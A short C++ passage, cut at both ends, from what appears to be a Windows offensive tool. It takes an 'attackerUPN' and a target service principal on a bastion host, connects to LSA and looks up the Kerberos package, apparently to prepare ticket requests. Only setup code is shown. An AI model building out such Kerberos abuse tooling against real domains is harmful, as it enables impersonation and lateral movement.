        return 1;
    }

    const wchar_t* attackerUPN = argv[1];
    const wchar_t* targetSPN   = argv[2]; // e.g., HOST/bastion01.bastion.local

    LSA_HANDLE lsaHandle = nullptr;
    NTSTATUS status = LsaConnectUntrusted(&lsaHandle);
    if (status != STATUS_SUCCESS)
    {
        wprintf(L"[-] LsaConnectUntrusted failed: 0x%08x\n", status);
        return 1;
    }

    // Look up the Kerberos authentication package
    LSA_STRING packageName;
    packageName.Buffer = const_cast<char*>("Kerberos");
    packageName.Length = (USHORT)strlen(packageName.Buffer);
    packageName.MaximumLength = packageName.Length + 1;

    ULONG authPkgId = 0;
    status = LsaLookupAuthenticationPackage(lsaHandle, &packageName, &authPkgId);
    if (status != STATUS_SUCCESS)
